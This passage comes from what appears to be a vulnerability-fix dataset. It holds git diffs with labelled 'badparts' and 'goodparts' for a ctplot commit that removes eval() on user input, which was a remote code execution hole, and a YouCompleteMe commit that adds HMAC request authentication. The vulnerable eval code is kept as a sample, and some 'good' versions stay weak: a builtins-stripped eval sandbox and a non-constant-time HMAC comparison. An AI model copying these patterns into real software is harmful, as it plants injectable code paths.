enumerate(self.s):\n-            self._append('sr', '{}:{}:{}:{}'.format(s, self.rw[i], self.rs[i], self.rc[i]) if s else None)\n+            self._append('sr', '{}:{}:{}:{}'.format(path.join(config['datadir'], s), self.rw[i], self.rs[i], self.rc[i]) if s else None)\n \n         self.legend = []\n         self.textboxes = []\n@@ -233,7 +234,6 @@ def _prepare_data(self):\n         # prefilled with empty lists\n         expr_data = {}\n         joined_cuts = {}  # OR of all cuts\n-        log.debug('self.sr={}'.format(self.sr))\n         for n, s in enumerate(self.sr):\n             if s:\n                 if s not in expr_data:\n@@ -288,7 +288,6 @@ def _get_data(self, expr_data, filters, units = {}):\n             ss = s.strip().split(':')\n             with tables.openFile(ss[0], 'r') as h5:\n                 table = h5.getNode(ss[1])\n-\n                 window = float(eval(ss[2])) if ss[2] != 'None' else None\n                 shift = float(ss[3]) if ss[3] != 'None' else 1\n                 weight = ss[4] if ss[4] != 'None' else None\n@@ -512,7 +511,19 @@ def _configure_post(self):\n                     getattr(plt, '{}scale'.format(a))(s)\n                 r = getattr(self, a + 'r' + ('tw' if a == v else ''))\n                 if r:  # range (limits)\n-                    getattr(plt, '{}lim'.format(a))(eval(r))\n+                    rmin, rmax = r.split(',')\n+                    rlim = getattr(plt, '{}lim'.format(a))\n+                    # defaults\n+                    rmind, rmaxd = rlim()\n+                    # set range\n+                    try:\n+                        rmin = rmind if rmin == '' else float(rmin)\n+                        rmax = rmaxd if rmax == '' else float(rmax)\n+                        log.debug('rmin={}, rmax={}'.format(rmin, rmax))\n+                        rlim(rmin, rmax)\n+                    except ValueError:\n+                        # ignore if input is no float\n+                        pass\n \n         # legend\n         plt.axes(self.axes.values()[-1])  # activate last added axes\n@@ -551,17 +562,25 @@ def opts(self, i):\n         o = {}\n         for k, v in self.__dict__.iteritems():\n             if k.startswith('o') and v[i] is not None:\n-#                o[k[1:]] = v[i]\n-                try: o[k[1:]] = eval(v[i])\n-                except: o[k[1:]] = v[i]\n+                log.debug('v[{}]={}'.format(i, v[i]))\n+                log.debug('k[]={}'.format(k))\n+                try:\n+                    o[k[1:]] = float(v[i])\n+                except:\n+                    o[k[1:]] = v[i]\n         return o\n \n \n     def bins(self, i, a):\n         try:\n             b = getattr(self, a + 'b')[i]\n-            if b: return eval(b)\n-            else: raise\n+            if b:\n+                bn = b.split(',')\n+                if len(bn) == 1:\n+                    return float(bn[0])\n+                return tuple([float(x) for x in bn])\n+            else:\n+                raise\n         except:\n             return 0\n \n@@ -628,7 +647,7 @@ def save(self, name = 'fig', extensions = ('png', 'pdf', 'svg')):\n         names = []\n         for ext in extensions:\n             n = name + '.' + ext\n-            log.debug('saving plot to %n', n)\n+            log.debug('saving plot to %s', n)\n             plt.savefig(n, bbox_inches = 'tight', pad_inches = 0.5 if 'map' in self.m else 0.1, transparent = False)\n             names.append(n)\n \n@@ -664,9 +683,8 @@ def fit(self, i, x, y, yerr = None):\n                 yerr = yerr[m]\n             x , y = x[m], y[m]\n \n-\n-\n-            p = eval(self.fp[i])\n+            # gather fit parameters\n+            p = tuple([float(fp) for fp in self.fp[i].split(',')])\n             try:\n                 p, c = curve_fit(fitfunc, x, y, p, yerr)\n                 log.info('parameters = {}'.format(p))\ndiff --git a/ctplot/safeeval.py b/ctplot/safeeval.py\nindex 0832443..6fa8690 100644\n--- a/ctplot/safeeval.py\n+++ b/ctplot/safeeval.py\n@@ -14,19 +14,19 @@\n #    GNU General Public License for more details.\n #\n #    You should have received a copy of the GNU General Public License\n-#    along with this program.  If not, see <http://www.gnu.org/licenses/>. \n+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n #\n import numpy as np\n import dateutil.parser as dp\n \n-_safe_globals = {\"__builtins__\":None}\n+_safe_globals = { \"__builtins__\": None, \"__import__\": None }\n _safe_locals = {}\n \n-#add any needed builtins back in. \n+#add any needed builtins back in.\n for k in []:\n     _safe_locals[k] = eval(k)\n \n-# numpy functions    \n+# numpy functions\n for k, v in np.__dict__.iteritems():\n     _safe_locals[k] = getattr(np, k)\n \ndiff --git a/ctplot/web/js/99-web.js b/ctplot/web/js/99-web.js\nindex a2eb52f..3f52783 100644\n--- a/ctplot/web/js/99-web.js\n+++ b/ctplot/web/js/99-web.js\n@@ -93,6 +93,7 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.\n                 $.each(data, function(id, info) {\n                     // console.debug(id+' -- '+info);\n                     var m = id.match(/(.*):(.*)/);\n+                    console.log(m);\n                     // filename incl. path\n                     var file = m[1];\n                     // filename only, w/o path and extension\n@@ -103,7 +104,7 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.\n                     // add a selectable option for this dataset and table\n                     var opt = $('<option>').text(filename + ' - ' + info[0]).val(id).appendTo(datasetbox);\n \n-                    var experiment = file.match(/(.+?\\/)*(.*?)\\/.+?/)[2];\n+                    var experiment = file.match(/(.*?)\\/.+?/)[1];\n                     console.debug('experiment = ' + experiment + ' / ' + id);\n                     opt.addClass('ex-' + experiment);\n                     if (experimentbox.find('option').filter(function() {\n@@ -744,9 +745,6 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.\n             target = $(':input[name=\"'+target+'\"]');\n             target.val(target.val()+', '+input.val());\n             \n-            if(target.val().match(/^\\s*,\\s*$/)) {\n-                target.val('');\n-            }\n             console.debug(target.attr('name')+' = '+target.val());\n         });\n     }\n", "files": {"/ctplot/plot.py": {"changes": [{"diff": "\n from safeeval import safeeval\n from locket import lock_file\n \n-logging.basicConfig(level = logging.ERROR, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')\n+logging.basicConfig(level = logging.DEBUG, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')\n \n log = logging.getLogger('plot')\n \n", "add": 1, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["logging.basicConfig(level = logging.ERROR, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')"], "goodparts": ["logging.basicConfig(level = logging.DEBUG, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')"]}, {"diff": "\n         try:\n             h5 = tables.openFile(f, 'r')\n             for n in h5.walkNodes(classname = 'Table'):\n-                tab = f + ':' + n._v_pathname\n+                tab = f[dirlen+1:] + ':' + n._v_pathname\n                 tabs[tab] = TableSpecs(n._v_title, n.colnames, json.loads(n.attrs.units), int(n.nrows))\n             h5.close()\n         except:\n", "add": 1, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["                tab = f + ':' + n._v_pathname"], "goodparts": ["                tab = f[dirlen+1:] + ':' + n._v_pathname"]}, {"diff": "\n \n         # source with rate averaging\n         for i, s in enumerate(self.s):\n-            self._append('sr', '{}:{}:{}:{}'.format(s, self.rw[i], self.rs[i], self.rc[i]) if s else None)\n+            self._append('sr', '{}:{}:{}:{}'.format(path.join(config['datadir'], s), self.rw[i], self.rs[i], self.rc[i]) if s else None)\n \n         self.legend = []\n         self.textboxes = []\n", "add": 1, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["            self._append('sr', '{}:{}:{}:{}'.format(s, self.rw[i], self.rs[i], self.rc[i]) if s else None)"], "goodparts": ["            self._append('sr', '{}:{}:{}:{}'.format(path.join(config['datadir'], s), self.rw[i], self.rs[i], self.rc[i]) if s else None)"]}, {"diff": "\n         # prefilled with empty lists\n         expr_data = {}\n         joined_cuts = {}  # OR of all cuts\n-        log.debug('self.sr={}'.format(self.sr))\n         for n, s in enumerate(self.sr):\n             if s:\n                 if s not in expr_data:\n", "add": 0, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["        log.debug('self.sr={}'.format(self.sr))"], "goodparts": []}, {"diff": "\n                     getattr(plt, '{}scale'.format(a))(s)\n                 r = getattr(self, a + 'r' + ('tw' if a == v else ''))\n                 if r:  # range (limits)\n-                    getattr(plt, '{}lim'.format(a))(eval(r))\n+                    rmin, rmax = r.split(',')\n+                    rlim = getattr(plt, '{}lim'.format(a))\n+                    # defaults\n+                    rmind, rmaxd = rlim()\n+                    # set range\n+                    try:\n+                        rmin = rmind if rmin == '' else float(rmin)\n+                        rmax = rmaxd if rmax == '' else float(rmax)\n+                        log.debug('rmin={}, rmax={}'.format(rmin, rmax))\n+                        rlim(rmin, rmax)\n+                    except ValueError:\n+                        # ignore if input is no float\n+                        pass\n \n         # legend\n         plt.axes(self.axes.values()[-1])  # activate last added axes\n", "add": 13, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["                    getattr(plt, '{}lim'.format(a))(eval(r))"], "goodparts": ["                    rmin, rmax = r.split(',')", "                    rlim = getattr(plt, '{}lim'.format(a))", "                    rmind, rmaxd = rlim()", "                    try:", "                        rmin = rmind if rmin == '' else float(rmin)", "                        rmax = rmaxd if rmax == '' else float(rmax)", "                        log.debug('rmin={}, rmax={}'.format(rmin, rmax))", "                        rlim(rmin, rmax)", "                    except ValueError:", "                        pass"]}, {"diff": "\n         o = {}\n         for k, v in self.__dict__.iteritems():\n             if k.startswith('o') and v[i] is not None:\n-#                o[k[1:]] = v[i]\n-                try: o[k[1:]] = eval(v[i])\n-                except: o[k[1:]] = v[i]\n+                log.debug('v[{}]={}'.format(i, v[i]))\n+                log.debug('k[]={}'.format(k))\n+                try:\n+                    o[k[1:]] = float(v[i])\n+                except:\n+                    o[k[1:]] = v[i]\n         return o\n \n \n     def bins(self, i, a):\n         try:\n             b = getattr(self, a + 'b')[i]\n-            if b: return eval(b)\n-            else: raise\n+            if b:\n+                bn = b.split(',')\n+                if len(bn) == 1:\n+                    return float(bn[0])\n+                return tuple([float(x) for x in bn])\n+            else:\n+                raise\n         except:\n             return 0\n \n", "add": 13, "remove": 5, "filename": "/ctplot/plot.py", "badparts": ["                try: o[k[1:]] = eval(v[i])", "                except: o[k[1:]] = v[i]", "            if b: return eval(b)", "            else: raise"], "goodparts": ["                log.debug('v[{}]={}'.format(i, v[i]))", "                log.debug('k[]={}'.format(k))", "                try:", "                    o[k[1:]] = float(v[i])", "                except:", "                    o[k[1:]] = v[i]", "            if b:", "                bn = b.split(',')", "                if len(bn) == 1:", "                    return float(bn[0])", "                return tuple([float(x) for x in bn])", "            else:", "                raise"]}, {"diff": "\n         names = []\n         for ext in extensions:\n             n = name + '.' + ext\n-            log.debug('saving plot to %n', n)\n+            log.debug('saving plot to %s', n)\n             plt.savefig(n, bbox_inches = 'tight', pad_inches = 0.5 if 'map' in self.m else 0.1, transparent = False)\n             names.append(n)\n \n", "add": 1, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["            log.debug('saving plot to %n', n)"], "goodparts": ["            log.debug('saving plot to %s', n)"]}, {"diff": "\n                 yerr = yerr[m]\n             x , y = x[m], y[m]\n \n-\n-\n-            p = eval(self.fp[i])\n+            # gather fit parameters\n+            p = tuple([float(fp) for fp in self.fp[i].split(',')])\n             try:\n                 p, c = curve_fit(fitfunc, x, y, p, yerr)\n                 log.info('parameters = {}'.format(p))", "add": 2, "remove": 3, "filename": "/ctplot/plot.py", "badparts": ["            p = eval(self.fp[i])"], "goodparts": ["            p = tuple([float(fp) for fp in self.fp[i].split(',')])"]}]}, "/ctplot/safeeval.py": {"changes": [{"diff": "\n #    GNU General Public License for more details.\n #\n #    You should have received a copy of the GNU General Public License\n-#    along with this program.  If not, see <http://www.gnu.org/licenses/>. \n+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n #\n import numpy as np\n import dateutil.parser as dp\n \n-_safe_globals = {\"__builtins__\":None}\n+_safe_globals = { \"__builtins__\": None, \"__import__\": None }\n _safe_locals = {}\n \n-#add any needed builtins back in. \n+#add any needed builtins back in.\n for k in []:\n     _safe_locals[k] = eval(k)\n \n-# numpy functions    \n+# numpy functions\n for k, v in np.__dict__.iteritems():\n     _safe_locals[k] = getattr(np, k)\n", "add": 4, "remove": 4, "filename": "/ctplot/safeeval.py", "badparts": ["_safe_globals = {\"__builtins__\":None}"], "goodparts": ["_safe_globals = { \"__builtins__\": None, \"__import__\": None }"]}], "source": "\n import numpy as np import dateutil.parser as dp _safe_globals={\"__builtins__\":None} _safe_locals={} for k in[]: _safe_locals[k]=eval(k) for k, v in np.__dict__.iteritems(): _safe_locals[k]=getattr(np, k) _safe_locals['logbins']=lambda start, stop, count:[np.exp(x) for x in np.linspace(np.log(start), np.log(stop), count)] _safe_locals['since04']=lambda s:(dp.parse(s) -dp.parse('2004-01-01 00:00 +01')).total_seconds() class safeeval: def __init__(self, safe_globals=_safe_globals, safe_locals=_safe_locals): self.globals=safe_globals.copy() self.globals.update(safe_locals) self.locals={} def __setitem__(self, key, value): self.locals[key]=value def __getitem__(self, key): return self.locals[key] def __delitem__(self, key): del self.locals[key] def __call__(self, expr): return eval(expr, self.globals, self.locals) if __name__=='__main__': for k, v in _safe_locals.iteritems(): print k, v ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#    pyplot - python based data plotting tools\n#    created for DESY Zeuthen\n#    Copyright (C) 2012  Adam Lucke  software@louisenhof2.de\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU General Public License as published by\n#    the Free Software Foundation, either version 3 of the License, or\n#    (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU General Public License for more details.\n#\n#    You should have received a copy of the GNU General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>. \n#\nimport numpy as np\nimport dateutil.parser as dp\n\n_safe_globals = {\"__builtins__\":None}\n_safe_locals = {}\n\n#add any needed builtins back in. \nfor k in []:\n    _safe_locals[k] = eval(k)\n\n# numpy functions    \nfor k, v in np.__dict__.iteritems():\n    _safe_locals[k] = getattr(np, k)\n\n_safe_locals['logbins'] = lambda start, stop, count: [np.exp(x) for x in np.linspace(np.log(start), np.log(stop), count)]\n_safe_locals['since04'] = lambda s: (dp.parse(s) - dp.parse('2004-01-01 00:00 +01')).total_seconds()\n\nclass safeeval:\n    def __init__(self, safe_globals = _safe_globals, safe_locals = _safe_locals):\n        self.globals = safe_globals.copy()\n        self.globals.update(safe_locals)\n        self.locals = {}\n\n    def __setitem__(self, key, value):\n        self.locals[key] = value\n\n    def __getitem__(self, key):\n        return self.locals[key]\n\n    def __delitem__(self, key):\n        del self.locals[key]\n\n    def __call__(self, expr):\n#        print 'safeval', expr\n        return eval(expr, self.globals, self.locals)\n\nif __name__ == '__main__':\n    for k, v in _safe_locals.iteritems():\n        print k, v\n\n"}}, "msg": "- fixes remote code execution vulnerability (closes #34)\n- prevent leaking file system paths to frontend (closes #33)"}}, "https://github.com/kkltcjk/YouCompleteMe": {"e965e0284789e610c0a50d20a92a82ec5c135064": {"url": "https://api.github.com/repos/kkltcjk/YouCompleteMe/commits/e965e0284789e610c0a50d20a92a82ec5c135064", "html_url": "https://github.com/kkltcjk/YouCompleteMe/commit/e965e0284789e610c0a50d20a92a82ec5c135064", "message": "Client/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution.", "sha": "e965e0284789e610c0a50d20a92a82ec5c135064", "keyword": "remote code execution prevent", "diff": "diff --git a/python/ycm/client/base_request.py b/python/ycm/client/base_request.py\nindex 7f609727..c9c417f4 100644\n--- a/python/ycm/client/base_request.py\n+++ b/python/ycm/client/base_request.py\n@@ -24,6 +24,7 @@\n from requests_futures.sessions import FuturesSession\n from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\n from ycm import vimsupport\n+from ycm import utils\n from ycm.utils import ToUtf8Json\n from ycm.server.responses import ServerError, UnknownExtraConf\n \n@@ -31,6 +32,7 @@\n _EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n # Setting this to None seems to screw up the Requests/urllib3 libs.\n _DEFAULT_TIMEOUT_SEC = 30\n+_HMAC_HEADER = 'x-ycm-hmac'\n \n class BaseRequest( object ):\n   def __init__( self ):\n@@ -88,24 +90,28 @@ def _TalkToHandlerAsync( data,\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n@@ -113,8 +119,18 @@ def DelayedSendRequest( data, handler, method ):\n     return SendRequest( data, handler, method, timeout )\n \n \n+  @staticmethod\n+  def _ExtraHeaders( request_body = None ):\n+    if not request_body:\n+      request_body = ''\n+    headers = dict( _HEADERS )\n+    headers[ _HMAC_HEADER ] = utils.CreateHexHmac( request_body,\n+                                                   BaseRequest.hmac_secret )\n+    return headers\n+\n   session = FuturesSession( executor = _EXECUTOR )\n   server_location = 'http://localhost:6666'\n+  hmac_secret = ''\n \n \n def BuildRequestData( start_column = None,\n@@ -141,6 +157,7 @@ def BuildRequestData( start_column = None,\n \n def JsonFromFuture( future ):\n   response = future.result()\n+  _ValidateResponseObject( response )\n   if response.status_code == requests.codes.server_error:\n     _RaiseExceptionForData( response.json() )\n \n@@ -153,6 +170,13 @@ def JsonFromFuture( future ):\n   return None\n \n \n+def _ValidateResponseObject( response ):\n+  if not utils.ContentHexHmacValid( response.content,\n+                                    response.headers[ _HMAC_HEADER ],\n+                                    BaseRequest.hmac_secret ):\n+    raise RuntimeError( 'Received invalid HMAC for response!' )\n+  return True\n+\n def _BuildUri( handler ):\n   return urlparse.urljoin( BaseRequest.server_location, handler )\n \n@@ -163,7 +187,9 @@ def _CheckServerIsHealthyWithCache():\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n \ndiff --git a/python/ycm/server/hmac_plugin.py b/python/ycm/server/hmac_plugin.py\nnew file mode 100644\nindex 00000000..b433b2b0\n--- /dev/null\n+++ b/python/ycm/server/hmac_plugin.py\n@@ -0,0 +1,57 @@\n+#!/usr/bin/env python\n+#\n+# Copyright (C) 2014  Google Inc.\n+#\n+# This file is part of YouCompleteMe.\n+#\n+# YouCompleteMe is free software: you can redistribute it and/or modify\n+# it under the terms of the GNU General Public License as published by\n+# the Free Software Foundation, either version 3 of the License, or\n+# (at your option) any later version.\n+#\n+# YouCompleteMe is distributed in the hope that it will be useful,\n+# but WITHOUT ANY WARRANTY; without even the implied warranty of\n+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+# GNU General Public License for more details.\n+#\n+# You should have received a copy of the GNU General Public License\n+# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n+\n+import logging\n+import httplib\n+from bottle import request, response, abort\n+from ycm import utils\n+\n+_HMAC_HEADER = 'x-ycm-hmac'\n+\n+# This class implements the Bottle plugin API:\n+# http://bottlepy.org/docs/dev/plugindev.html\n+#\n+# We want to ensure that every request coming in has a valid HMAC set in the\n+# x-ycm-hmac header and that every response coming out sets such a valid header.\n+# This is to prevent security issues with possible remote code execution.\n+class HmacPlugin( object ):\n+  name = 'hmac'\n+  api = 2\n+\n+\n+  def __init__( self, hmac_secret ):\n+    self._hmac_secret = hmac_secret\n+    self._logger = logging.getLogger( __name__ )\n+\n+\n+  def __call__( self, callback ):\n+    def wrapper( *args, **kwargs ):\n+      body = request.body.read()\n+      if not utils.ContentHexHmacValid( body,\n+                                        request.headers[ _HMAC_HEADER ],\n+                                        self._hmac_secret ):\n+        self._logger.info( 'Dropping request with bad HMAC.' )\n+        abort( httplib.UNAUTHORIZED, 'Unauthorized, received bad HMAC.')\n+        return\n+      body = callback( *args, **kwargs )\n+      response.headers[ _HMAC_HEADER ] = utils.CreateHexHmac(\n+          body, self._hmac_secret )\n+      return body\n+    return wrapper\n+\ndiff --git a/python/ycm/server/ycmd.py b/python/ycm/server/ycmd.py\nindex 34e66172..64b0f07f 100755\n--- a/python/ycm/server/ycmd.py\n+++ b/python/ycm/server/ycmd.py\n@@ -27,10 +27,12 @@\n import waitress\n import signal\n import os\n+import base64\n from ycm import user_options_store\n from ycm import extra_conf_store\n from ycm import utils\n from ycm.server.watchdog_plugin import WatchdogPlugin\n+from ycm.server.hmac_plugin import HmacPlugin\n \n def YcmCoreSanityCheck():\n   if 'ycm_core' in sys.modules:\n@@ -103,6 +105,8 @@ def Main():\n   options = ( json.load( open( args.options_file, 'r' ) )\n               if args.options_file\n               else user_options_store.DefaultOptions() )\n+  utils.RemoveIfExists( args.options_file )\n+  hmac_secret = base64.b64decode( options[ 'hmac_secret' ] )\n   user_options_store.SetAll( options )\n \n   # This ensures that ycm_core is not loaded before extra conf\n@@ -126,6 +130,7 @@ def Main():\n   handlers.UpdateUserOptions( options )\n   SetUpSignalHandler(args.stdout, args.stderr, args.keep_logfiles)\n   handlers.app.install( WatchdogPlugin( args.idle_suicide_seconds ) )\n+  handlers.app.install( HmacPlugin( hmac_secret ) )\n   waitress.serve( handlers.app,\n                   host = args.host,\n                   port = args.port,\ndiff --git a/python/ycm/utils.py b/python/ycm/utils.py\nindex d9128716..095337c9 100644\n--- a/python/ycm/utils.py\n+++ b/python/ycm/utils.py\n@@ -25,6 +25,8 @@\n import socket\n import stat\n import json\n+import hmac\n+import hashlib\n from distutils.spawn import find_executable\n import subprocess\n import collections\n@@ -212,3 +214,11 @@ def SafePopen( *args, **kwargs ):\n   return subprocess.Popen( *args, **kwargs )\n \n \n+def ContentHexHmacValid( content, hmac, hmac_secret ):\n+  return hmac == CreateHexHmac( content, hmac_secret )\n+\n+\n+def CreateHexHmac( content, hmac_secret ):\n+  return hmac.new( hmac_secret,\n+                   msg = content,\n+                   digestmod = hashlib.sha256 ).hexdigest()\ndiff --git a/python/ycm/youcompleteme.py b/python/ycm/youcompleteme.py\nindex 448236eb..83849ce1 100644\n--- a/python/ycm/youcompleteme.py\n+++ b/python/ycm/youcompleteme.py\n@@ -22,6 +22,7 @@\n import tempfile\n import json\n import signal\n+import base64\n from subprocess import PIPE\n from ycm import vimsupport\n from ycm import utils\n@@ -58,6 +59,7 @@\n # Ctrl-C in Vim.\n signal.signal( signal.SIGINT, signal.SIG_IGN )\n \n+HMAC_SECRET_LENGTH = 16\n NUM_YCMD_STDERR_LINES_ON_CRASH = 30\n SERVER_CRASH_MESSAGE_STDERR_FILE = (\n   'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n@@ -80,16 +82,18 @@ def __init__( self, user_options ):\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n@@ -116,6 +120,7 @@ def _SetupServer( self ):\n \n       self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n       BaseRequest.server_location = 'http://localhost:' + str( server_port )\n+      BaseRequest.hmac_secret = hmac_secret\n \n     self._NotifyUserIfServerCrashed()\n \n@@ -148,7 +153,6 @@ def ServerPid( self ):\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n", "files": {"/python/ycm/client/base_request.py": {"changes": [{"diff": "\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n", "add": 14, "remove": 10, "filename": "/python/ycm/client/base_request.py", "badparts": ["        return BaseRequest.session.post( _BuildUri( handler ),", "                                        data = ToUtf8Json( data ),", "                                        headers = _HEADERS,", "                                        timeout = timeout )", "        return BaseRequest.session.get( _BuildUri( handler ),", "                                        headers = _HEADERS,", "                                        timeout = timeout )", "                              data = ToUtf8Json( data ),", "                              headers = _HEADERS )", "                             headers = _HEADERS )"], "goodparts": ["        sent_data = ToUtf8Json( data )", "        return BaseRequest.session.post(", "            _BuildUri( handler ),", "            data = sent_data,", "            headers = BaseRequest._ExtraHeaders( sent_data ),", "            timeout = timeout )", "        return BaseRequest.session.get(", "            _BuildUri( handler ),", "            headers = BaseRequest._ExtraHeaders(),", "            timeout = timeout )", "        sent_data = ToUtf8Json( data )", "                              data = sent_data,", "                              headers = BaseRequest._ExtraHeaders( sent_data ) )", "                             headers = BaseRequest._ExtraHeaders() )"]}, {"diff": "\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ", "add": 3, "remove": 1, "filename": "/python/ycm/client/base_request.py", "badparts": ["    response = requests.get( _BuildUri( 'healthy' ) )"], "goodparts": ["    response = requests.get( _BuildUri( 'healthy' ),", "                             headers = BaseRequest._ExtraHeaders() )", "    _ValidateResponseObject( response )"]}], "source": "\n import vim import requests import urlparse from retries import retries from requests_futures.sessions import FuturesSession from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor from ycm import vimsupport from ycm.utils import ToUtf8Json from ycm.server.responses import ServerError, UnknownExtraConf _HEADERS={'content-type': 'application/json'} _EXECUTOR=UnsafeThreadPoolExecutor( max_workers=30) _DEFAULT_TIMEOUT_SEC=30 class BaseRequest( object): def __init__( self): pass def Start( self): pass def Done( self): return True def Response( self): return{} @staticmethod def GetDataFromHandler( handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '', handler, 'GET', timeout)) @staticmethod def PostDataToHandler( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data, handler, timeout)) @staticmethod def PostDataToHandlerAsync( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout) @staticmethod def _TalkToHandlerAsync( data, handler, method, timeout=_DEFAULT_TIMEOUT_SEC): def SendRequest( data, handler, method, timeout): if method=='POST': return BaseRequest.session.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS, timeout=timeout) if method=='GET': return BaseRequest.session.get( _BuildUri( handler), headers=_HEADERS, timeout=timeout) @retries( 5, delay=0.5, backoff=1.5) def DelayedSendRequest( data, handler, method): if method=='POST': return requests.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS) if method=='GET': return requests.get( _BuildUri( handler), headers=_HEADERS) if not _CheckServerIsHealthyWithCache(): return _EXECUTOR.submit( DelayedSendRequest, data, handler, method) return SendRequest( data, handler, method, timeout) session=FuturesSession( executor=_EXECUTOR) server_location='http://localhost:6666' def BuildRequestData( start_column=None, query=None, include_buffer_data=True): line, column=vimsupport.CurrentLineAndColumn() filepath=vimsupport.GetCurrentBufferFilepath() request_data={ 'filetypes': 